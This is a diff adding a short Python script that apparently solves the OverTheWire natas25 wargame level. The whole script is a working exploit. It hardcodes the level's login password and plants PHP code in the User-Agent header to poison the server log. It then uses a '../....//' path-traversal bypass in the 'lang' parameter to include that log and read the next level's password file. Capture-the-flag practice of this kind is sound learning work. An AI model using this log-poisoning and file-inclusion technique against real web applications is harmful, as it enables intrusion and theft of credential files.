@@ -1,0 +1,9 @@
+#!/usr/bin/env python
+
+import requests, string
+
+url = "http://natas25.natas.labs.overthewire.org/"
+auth = ("natas25", "GHF6X7YwACaYYssHVY05cFq83hRktl4c")
+
+response = requests.get(url, auth=auth, cookies={"PHPSESSID": "foobar"}, headers={"User-Agent": "<?php include('/etc/natas_webpass/natas26'); ?>"}, params=[("lang", "../....//logs/natas25_foobar.log")])
+print(response.text)
